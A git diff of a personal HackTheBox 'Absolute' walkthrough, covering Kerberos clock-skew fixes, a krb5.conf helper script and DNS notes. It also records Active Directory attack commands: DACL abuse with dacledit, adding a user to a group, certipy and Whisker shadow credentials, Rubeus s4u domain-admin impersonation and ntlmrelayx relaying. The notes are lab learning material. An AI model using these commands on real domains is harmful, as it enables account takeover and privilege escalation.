@@ -6,13 +6,15 @@ Difficulty:  Insane - but not hard as when released due to AD hacking Tool issue
 Goals:  
 - Azure AD changes overhaul
 - Silver, Golden, Diamond and Sapphire Tickets 
-- VS Code / Codium and snyk plugin is must to have!
+- VS Code / Codium and Snyk plugin is must to have!
 Learnt:
-- [tron for Cleaning you Windows](https://github.com/bmrf/tron)
+- [tron for Cleaning your Windows](https://github.com/bmrf/tron)
 - `grep -B $LinesBefore -A $LinesAfter `
 - `ntpdate -s` multiple times to be very very safe!  
 	- Actually over and over and over again
 - [Skew-whiff](https://dictionary.cambridge.org/dictionary/english/skew-whiff)  is hyphenated and again the clock Skew is just a every time before anything command
+- Impacket branches and various functionality not in the main branch
+- samba.org `net` commands 
 Beyond Root:
 - Silver, Golden, Diamond and Sapphire Tickets
 - Author and manage a Azure Policy for Kerberos and research that
@@ -28,6 +30,7 @@ Tripletted with [[Response-Helped-Through]] and [[Dynstr-Helped-Through]]
 [Ippsec Video](https://www.youtube.com/watch?v=rfAmMQV_wss)
 [Alh4zr3d Stream](https://www.twitch.tv/videos/1855594279) - does not exist any more
 [0xDF Written Writeup](https://0xdf.gitlab.io/2023/05/27/htb-absolute.html)
+I also used the Official Write Up that is the .pdf in this directory 
 
 ## Recon
 
@@ -504,6 +507,10 @@ Did not work and Kinit is the way
 KRB5CCNAME=SVC_SMB.ccache impacket-smbclient -dc-ip 10.129.229.59 -k absolute.htb/smb_svc@dc.absolute.htb/Shared
 ```
 
+#### After awhile of considering how to proceed 
+
+I starting by research if Kali issues with `ntpdate` and `ntpsec` were the issue, but either I found two bad answers: either set up my own `ntp` server - very noisy or potential use a different distribution.
+
 The waves of joy - after reading this.
 ![](fromtheofficialwriteup.png)
 
@@ -535,9 +542,98 @@ To disable one-off time synchronization in a VM, you must set the following adva
 |---|
 |time.synchronize.continue = "FALSE"<br>time.synchronize.restore = "FALSE"<br>time.synchronize.resume.disk = "FALSE"<br>time.synchronize.shrink = "FALSE"<br>time.synchronize.tools.startup = "FALSE"<br>time.synchronize.tools.enable = "FALSE"<br>time.synchronize.resume.host = "FALSE"|
 
+
 [Virtualbox](https://forums.virtualbox.org/viewtopic.php?t=97014)
 ```bash
 VBoxManage setextradata "VM name" "VBoxInternal/Devices/VMMDev/0/Config/GetHostTimeDisabled" 1
+```
+
+#### Back to the machine 
+
+HURRAY Clock Skewage is gone!
+![](krb5conffromwriteup.png)
+
+Fixed and updated my management script:
+```bash
+#!/bin/bash
+# Author: 7ru7h
+if [ "$#" -ne 5 ]; then
+        echo "Usage: $0 <cmd: add / remove>/ setup <realm> <kdc> <admin_server> <default_domain>"
+	echo "BEWARE - This will require super user access and modify and important file - BEWARE"
+	echo "run \`sudo apt-get install krb5-user\' - put: \`KALI\` as default in all capitals, no \` for adding and removing a default realm"	
+	echo "Also requires KALI to be the set to the default_domain, which is not added on install"
+        echo ""
+	echo "... /etc/krb5.conf : ..."
+	echo ""
+	echo "[realms]
+	        KALI = {
+		                kdc = KALI
+				admin_server = KALI
+			}"
+	echo " ... "	
+	echo " Should be:"
+	echo ""
+	echo "[realms]
+	        KALI = {
+		                kdc = KALI
+				admin_server = KALI
+				default_domain = KALI
+			}"
+	echo ""
+	echo ""
+	exit
+fi
+
+CMD=$1
+echo "Backed up /etc/krb5.conf -> /etc/krb5.conf.bak"
+
+function setupKRB5Conf()
+{
+	echo "run \`sudo apt-get install krb5-user\' - put: KALI as default in all capitals for adding and removing a  default realm"
+	echo "\`sudo cp /etc/krb5.conf /etc/krb5.conf.bak\`"
+	echo "add \`default_domain = KALI\` under admin_server = KALI"
+}
+
+
+function addToKRB5Conf ()
+{
+        REALM=$1
+        KDC=$2
+        ADM=$3
+	DOM=$4
+        # add realm
+        sudo sed -i "s/admin_server = KALI/admin_server = $ADM/g" /etc/krb5.conf
+        sudo sed -i "s/kdc = KALI/kdc = $KDC/g" /etc/krb5.conf
+	sudo sed -i "s/default_domain = KALI/domain = $DOM/g" /etc/krb5.conf
+        sudo sed -i "s/default_realm = KALI/default_realm = $REALM/g" /etc/krb5.conf
+        cat /etc/krb5.conf
+	echo "Added: $@"
+        return
+}
+
+function removeFromKRB5Conf ()
+{
+        REALM=$1
+        KDC=$2
+        ADM=$3
+	DOM=$4
+        sudo sed -i "s/kdc = $KDC/kdc = KALI/g" /etc/krb5.conf
+        sudo sed -i "s/admin_server = $ADM/admin_server = KALI/g" /etc/krb5.conf
+        sudo sed -i "s/default_realm = $REALM/default_realm = KALI/g" /etc/krb5.conf
+        sudo sed -i "s/default_domain = $DOM /default_realm = KALI/g" /etc/krb5.conf
+	cat /etc/krb5.conf
+	echo "Removed and replacing back to default KALI every field: $@"
+        return
+}
+
+case "$CMD" in
+        add) addToKRB5Conf $2 $3 $4 $5 ;;
+        remove) removeFromKRB5Conf $2 $3 $4 $5 ;;
+        setup) setupKRB5Conf ;;
+        *) echo "$CMD is invalid" ;;
+esac
+exit
+
 ```
 
 Ippsec: LDAPsearch
@@ -546,7 +642,16 @@ Ippsec: LDAPsearch
 kinit d.klay
 /etc/hosts # must have dc.absolute.htb first
 ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -b="cn=users,dc=absolute,dc=htb" "users" "description"
+# 
 ```
+![](ldapbroke.png)
+So tried at the suggestion of ChatGPT to run:
+```
+ldapsearch -x -LLL -H ldap://dc.absolute.htb -s base supportedSASLMechanisms
+```
+![](supportedinded.png)
+
+Then I realised I had retrod a previous step and continued to connecting to the SMB share
 
 Ippsec: Get a ticket for svc_smb account
 ```bash
@@ -560,6 +665,8 @@ KRB5CCNAME=SVC_SMB.ccache impacket-smbclient -k absolute.htb/svc_smb@$IP -target
 KRB5CCNAME=SVC_SMB.ccache impacket-smbclient -k absolute.htb/svc_smb@dc.absolute.htb -target-ip $IP
 ```
 
+![](ohyes.png)
+
 Ippsec: Python Virtual environments to manage impacket libraries and versioning
 ```python
 python3 -m venv venv
@@ -570,6 +677,9 @@ pip install .
 # deactivate # To deactivate virtual environment
 ```
 
+Impacket had been updated by this point, but I have also use python virtual environments a lot with other machines considering the kali python3 changes to apt. Plundering the SMB Share "Shared" felt good after four months of doing this machine.
+
+![](plunder.png)
 
 Before transferring to a Windows VM Alh4zr3d did:
 ```bash
@@ -577,7 +687,7 @@ file test.exe
 string test.exe
 ```
 
-Ippsec: Sharing VPN with Window guest to your Linux guest 
+[Ippsec.Rocks](https://ippsec.rocks): Sharing VPN with your Window guest from your Linux host 
 ```bash
 # Check if IP fowarding is enabled 
 cat /proc/sys/net/ipv4/ip_forward
@@ -593,8 +703,7 @@ sudo iptables -A FORWARD -i $INTERFACE -o tun0 -j ACCEPT
 sudo iptables -t NAT -A POSTROUTING -s INF-IP/RANGE -o tun0 -j MASQUERADE
 ```
 
-[[Sharp-Helped-Through]] has more verbose instructions
-Ippsec: 
+[[Sharp-Helped-Through]] has more verbose instructions. Ippsec: 
 ```powershell
 # Create route on Windows machine
 route add 10.10.10.0/23 mask 255.255.254.0 gw $LINUXIP
@@ -614,19 +723,47 @@ echo "127.0.0.1 dc.absolute.htb absolute.htb" >> C:\Windows\System32\drivers\etc
 # test.exe is not using the hosts file
 ```
 
-https://kevincurran.org/com320/labs/dns.htm
+#### DNS Detour 
 
+I decided to to take a 30 minute detour through setting up DNS on Windows from the [KevinCurran lab](https://kevincurran.org/com320/labs/dns.htm) as I had not done that yet and knowing DNS and myself - I need it. 
 
-Ippsec and Alh4zr3d: Wireshark
-
-Packet capture with `netsh`
 ```powershell
-netsh
+ipconfig /displaydns # bewrare alot of entries even by default
+ipconfig /flushdns # delete all entries
+# Perform DNS lookup without nslookup
+ping $domain.$tld
+ipconfig /displaydns
+# with nslookup
+nslookup dnsisdnssobedomainiant.dns
+nslookup 10.10.10.10 # reverse lookup IP returns domain
+# Windows hosts file is stored:
+C:\Windows\System32\Drivers\Etc\hosts
+# Hosts file data always stays in the DNS cache
+# Administrative notepad required!
+notepad C:\Windows\System32\Drivers\Etc\hosts
+# Lines addded for IPv4 = `10.10.10.10 dnsisdnssobedomainiant.dns`
 ```
 
+#### Skipping section
+
+Given how I have configured everything and have limited time as I put so much time into testing to make configuration template for later machines I will skip the reversing of the binary. Ippsec and Alh4zr3d used  Wireshark after running `test.exe` and it send plaintext LDAP credential over to authenticate with the DC
+
+![](4monnthsofthisskipptyitmustbe.png)
+
+You could also Packet capture with `netsh`
+```powershell
+netsh trace start capture=yes tracefile=C:\users\$user\desktop\$pcapname.etl
+netsh trace stop
+```
 
 Bloodhound check `m.lovegod` find the shadow credentials. Ippsec: DACLEdit
+```bash
+impacket-getTGT absolute.htb/m.lovegod:AbsoluteLDAP2022! -dc-ip dc.absolute.htb
+# Running this mostly for the glory of screenshot without some weird kerberos error!
+KRB5CCNAME=m.lovegod.ccache $bloodhoundPythonInstallMethod -k -dc dc.absolute.htb -ns 10.129.229.59 -c all -d absolute.htb -u m.lovegod -p 'AbsoluteLDAP2022!' --zip
+```
 
+![](FORTHELOVEtheKERBGOD.png)
 
 Alh4zr3d `pipx` showcase that I do not want to replicate: - [ldap_shell](https://github.com/PShlyundin/ldap_shell)
 ```bash
@@ -643,20 +780,199 @@ add_user_to_group m.lovegod 'NETWORK AUDIT'
 certipy shadow auto -k -u absolute.htb/m.lovegod@dc.absolute.htb -dc-ip $IP -target dc.absolute.htb -account winrm_user -p ''
 ```
 
+[Ippsec Video feels so good at this point knowing that I may never have ever worry about Linux Kerberos until all the tools break again and then its just fixing a tool! GLORIOUS](https://www.youtube.com/watch?v=rfAmMQV_wss). 
+
+DACLEDit is not main branch impacket
+```bash
+git clone https://github.com/ShutdownRepo/impacket -b dacledit
+# Ippsec: Python Virtual environments to manage impacket libraries and versioning
+python3 -m venv .venv
+source .venv/bin/activate 
+pip3 install .
+# deactivate # To deactivate virtual environment
+# GET TICKET for the python venv!
+# AbsoluteLDAP2022!
+getTGT.py absolute.htb/m.lovegod 
+KRB5CCNAME=$(pwd)/m.lovegod.ccache ../impacket/examples/dacledit.py -k -no-pass -dc-ip 10.129.229.59 -principal m.lovegod -action write -target "Network Audit"  -rights FullControl absolute.htb/m.lovegod
+# Add m.lovegod to the group with net rpc
+kinit m.lovegod
+net rpc group help # -? to list options
+net rpc group addmem "Network Audit" -k -U m.lovegod -S dc.absolute.htb m.lovegod
+# we need another TGT as we are now a memeber of the group
+getTGT.py absolute.htb/m.lovegod
+```
+
+![1080](mclovegodding.png)
+Then  quickly:
+![](quicklythedeprecation.png)
+
+[Samba net command](https://www.samba.org/samba/docs/current/man-html/net.8.html)
+```bash
+# Requires correct configuration of /etc/krb5.conf
+kinit Administrator
+net ads info
+# Get closest DC in domain and retrieve server information
+net ads lookup 
+
+net ads join -k # Kerberos Auth
+net ads join -U Administrator # NTLM Auth
+# Join a computer account
+# Beware all the additiona requirements required: https://sssd.io/docs/ad/ad-provider-manual.html
+net ads join createcomputer="<OU>" createupn
+
+
+# List all users
+net rpc user
+# List domain info of a specific user
+net rpc user info $username
+
+# List all groups
+net rpc group list
+# List all users of a specific group
+net rpc group members  $group
+# Add a user to a specific group
+net rap groupmember add $group $username
+
+# Remote Command execution - Only works with OS/2 servers. Not currently implement :(
+# net rap admin $cmd
+
+# Enumerates all exported resources (network shares) on target server.
+net share $target
+
+
+# Creating Additional principals:
+# Keytabs do not need to be created on the DC
+# Require sufficient ACLs to jon to the domain 
+net ads keytab add
+```
+
 Ippsec: Certipy to add shadow credential to winrm
 ```bash
 KRB5CCANME=m.lovegod.ccache certipy shadow auto -k -no-pass -u absolute.htb/m.lovegod@dc.absolute.htb -dc-ip $IP -target dc.absolute.htb -account winrm_user
 ```
 
+As we are still in the python virtual environment I will install `certipy` with `pip3` as kali variant of `python3-certipy` has been weird for at least six months  
+```bash
+pip3 install certipy-ad
+```
 
-KRBRelay 
 
-https://www.youtube.com/watch?v=rfAmMQV_wss 
+```bash
+# AbsoluteLDAP2022!
+../impacket/examples/getTGT.py absolute.htb/m.lovegod
+KRB5CCNAME=$(pwd)/m.lovegod.ccache ../impacket/examples/dacledit.py -k -no-pass -dc-ip 10.129.229.59 -principal m.lovegod -action write -target "Network Audit"  -rights FullControl absolute.htb/m.lovegod
 
+kinit m.lovegod
+net rpc group addmem "Network Audit" -k -U  m.lovegod -S dc.absolute.htb m.lovegod 
+../impacket/examples/getTGT.py absolute.htb/m.lovegod
+net rpc group members "Network Audit" -k -U m.lovegod -S dc.absolute.htb 
+
+KRB5CCANME=m.lovegod.ccache certipy shadow auto -k -no-pass -u absolute.htb/m.lovegod@dc.absolute.htb -dc-ip 10.129.229.59 -target dc.absolute.htb -account winrm_user
+```
+
+It worked!
+![](inthegroupyeslovegodisinthegroup.png)
+
+Over four months of tinkering and learning!
+![1080](certifiedjoyiousholyhappiness.png)
+
+https://www.youtube.com/watch?v=_nGpZ1ydzS8
+
+![](winrmuserwinrmevillyso.png)
+
+#### WTF are the shadow credentials!
+
+A summary and explanation of Shadow credentials mostly from the sources: [iredteam](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials) [hacker.recipes](https://www.thehacker.recipes/a-d/movement/kerberos/shadow-credentials)
+Described by [Elad Shamir](https://medium.com/@elad.shamir) (Service Architect at [SpecterOps](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)) as *a technique allows an attacker to take over an AD user or computer account if the attacker can modify the target object's (user or computer account) attribute `msDS-KeyCredentialLink` and append it with alternate credentials in the form of certificates.- iredteam*.  `msDS-KeyCredentialLink` is an attribute for raw public keys of any Active Directory user and computer objects. When initialisation kerberos authentication the pre-authenticate check run by the KDC will include a matching private key for the TGT to set if there is a match.
+
+**Requirements**:
+- Domain must have Active Directory Certificate Services and Certificate Authority configured.
+- Domain must have at least one DC running with Windows Server 2016 that supports PKINIT.
+
+***WARNING*** - thehacker.recipes: *The `msDS-KeyCredentialLink` feature was introduced with Windows Server 2016. However, this is not to be confused with PKINIT which was already present in Windows 2000. The `msDS-KeyCredentialLink` feature allows to link an X509 certificate to a domain object, that's all.*
+
+1. Create an RSA key pair
+2. Create an X509 certificate configured with the public key
+3. Create a [KeyCredential](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/de61eb56-b75f-4743-b8af-e9be154b47af) structure featuring the raw public key and add it to the `msDs-KeyCredentialLink` attribute
+4. Authenticate using PKINIT and the certificate and private key
+
+From Windows
+```powershell
+# Enumerate for target account
+Whisker.exe list /target:"TARGET_SAMNAME"
+# Add target account
+Whisker.exe add /target:"TARGET_SAMNAME"
+# Manaipulate
+Whisker.exe add /target:"TARGET_SAMNAME" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"
+
+# Show msds-keycredentiallink attribute
+get-netcomputer $TARGET_SAMNAME
+# Ask for TGT with Rubeus
+Rubeus.exe asktgt /user:$TARGET_SAMNAME /certificate:"CERT_KEY" /domain:$Domain.$TLD /dc:$DCName.$Domain.$TLD /getcredentials /show /ptt
+
+# Ask for TGS for DA for a coputer account takeover
+# As above add a shadow credential for this time a computer 
+# Whisker.exe add $newServiceName -> Rubeus.exe asktgt
+Rubeus.exe s4u /dc:$DCName.$Domain.$TLD  /ticket:$TICKET== /impersonateuser:$DomainAdminUser@$Domain.$TLD /ptt /self /service:host/$server.$Domain.$TLD /altservice:cifs/$newServiceName.$Domain.$TLD
+
+ls \\$newServiceName.$Domain.$TLD\c$
+
+```
+
+From Linux
+```bash
+pywhisker.py -d "FQDN_DOMAIN" -u "USER" -p "PASSWORD" --target "TARGET_SAMNAME" --action "list"
+# Add action from pywhisker is featured in ntlmrelayx
+ntlmrelayx -t ldap://dc02 --shadow-credentials --shadow-target 'dc01$'
+```
+
+thehacker.recipes: *User objects can't edit their own `msDS-KeyCredentialLink` attribute while computer objects can. This means the following scenario could work: [trigger an NTLM authentication](https://www.thehacker.recipes/a-d/movement/mitm-and-coerced-authentications) from DC01, [relay it](https://github.com/ShutdownRepo/The-Hacker-Recipes/blob/master/ad/movement/kerberos/broken-reference/README.md) o DC02, make pywhisker edit DC01's attribute to create a Kerberos PKINIT pre-authentication backdoor on it, and have persistent access to DC01 with PKINIT and [pass-the-cache](https://www.thehacker.recipes/a-d/movement/kerberos/ptc). Computer objects can only edit their own `msDS-KeyCredentialLink` attribute if KeyCredential is not set already.*
+
+[SpecterOps - Shadow Credentials Post](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
+
+## KRBRelay PrivEsc
+
+If LDAP signing is not enabled
+
+[snovvcrash](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/kerberos/kerberos-relay)
+
+- [https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html](https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html)
+- [https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)
+- [mitm6 + Kerberos DNS Relay + AD CS ESC8](https://github.com/snovvcrash/PPN/blob/master/pentest/infrastructure/ad/kerberos/kerberos-relay.md#mitm6--kerberos-dns-relay--ad-cs-esc8)
+- [https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/](https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/)
+
+#### Tools:
+- KrbRelay
+	- [https://github.com/cube0x0/KrbRelay](https://github.com/cube0x0/KrbRelay)
+	- [https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9](https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9)
+	- [https://icyguider.github.io/2022/05/19/NoFix-LPE-Using-KrbRelay-With-Shadow-Credentials.html](https://icyguider.github.io/2022/05/19/NoFix-LPE-Using-KrbRelay-With-Shadow-Credentials.html)
+- KrbRelayUp
+	- [https://github.com/Dec0ne/KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)
+	- [https://www.microsoft.com/security/blog/2022/05/25/detecting-and-preventing-privilege-escalation-attacks-leveraging-kerberos-relaying-krbrelayup/](https://www.microsoft.com/security/blog/2022/05/25/detecting-and-preventing-privilege-escalation-attacks-leveraging-kerberos-relaying-krbrelayup/)
+	- [https://github.com/BronzeBee/DavRelayUp](https://github.com/BronzeBee/DavRelayUp)
+	- [https://github.com/Dec0ne/DavRelayUp](https://github.com/Dec0ne/DavRelayUp)
+
+## THE FINAL HURDLE!
+
+![](uploadafterbuilding.png)
+
+But ofcourse `evil-winrm` breaks and so does `KrbRelay.exe` - big takeway - the in the real world the tools are broken and need modifications, investigation screenshots for exact run conditions
+![](toolosinting.png)
+
+The Writeup recommmends https://github.com/antonioCoco/RunasCs *is an utility to run specific processes with different permissions than the user's current logon provides using explicit credentials. This tool is an improved and open version of windows builtin runas.exe that solves some limitations:*
+- Allows explicit credentials
+- Works both if spawned from interactive process and from service process
+- Manage properly _DACL_ for _Window Stations_ and _Desktop_ for the creation of the new process
+- Uses more reliable create process functions like `CreateProcessAsUser()` and `CreateProcessWithTokenW()` if the calling process holds the required privileges (automatic detection)
+- Allows to specify the logon type, e.g. 8-NetworkCleartext logon (no _UAC_ limitations)
+- Allows to bypass UAC when an administrator password is known (flag --bypass-uac)
+- Allows to create a process with the main thread impersonating the requested user (flag --remote-impersonation)
+- Allows redirecting _stdin_, _stdout_ and _stderr_ to a remote host
+- It's Open Source :)
+
+![](totalnotcorrectpassword.png)
 
 ## Beyond Root
-
-What are shadow credentials - https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials
 
 Create and configure a DNS server  `dnscmd`
 https://learn.microsoft.com/en-us/windows-server/networking/dns/quickstart-install-configure-dns-server?tabs=powershell
@@ -668,6 +984,9 @@ https://learn.microsoft.com/en-us/windows-server/networking/dns/quickstart-insta
 #### Diamond Ticket
 
 #### Sapphire Ticket
+
+
+
 
 
 ## Azure
